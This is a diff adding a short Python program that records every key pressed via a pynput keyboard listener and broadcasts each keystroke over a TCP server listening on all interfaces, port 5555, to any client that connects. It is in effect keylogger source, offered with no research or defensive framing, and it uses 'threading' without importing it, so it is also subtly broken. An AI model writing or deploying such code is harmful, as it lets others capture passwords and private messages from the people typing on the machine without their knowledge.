@@ -1,0 +1,58 @@
+import socket
+from pynput import keyboard
+
+SERVER_HOST = '0.0.0.0'
+SERVER_PORT = 5555
+
+clients = []
+
+def on_press(key):
+    try:
+        message = f"[Key Pressed]: {key.char}"
+        forward_to_clients(message)
+    except AttributeError:
+        pass
+
+def forward_to_clients(message):
+    for client in clients:
+        try:
+            client.send(message.encode())
+        except Exception as e:
+            print(f"Error forwarding message to client: {e}")
+
+def handle_client(client_socket):
+    try:
+        while True:
+            data = client_socket.recv(1024)
+            if not data:
+                break
+            forward_to_clients(data.decode())
+    except Exception as e:
+        print(f"Error handling client: {e}")
+    finally:
+        clients.remove(client_socket)
+        client_socket.close()
+
+def start_server():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((SERVER_HOST, SERVER_PORT))
+    server.listen(5)
+    print(f"[*] Listening on {SERVER_HOST}:{SERVER_PORT}")
+
+    try:
+        while True:
+            client, addr = server.accept()
+            clients.append(client)
+
+            client_handler = threading.Thread(target=handle_client, args=(client,))
+            client_handler.start()
+    except KeyboardInterrupt:
+        print("\n[!] Server shutting down.")
+    finally:
+        server.close()
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+
+    start_server()
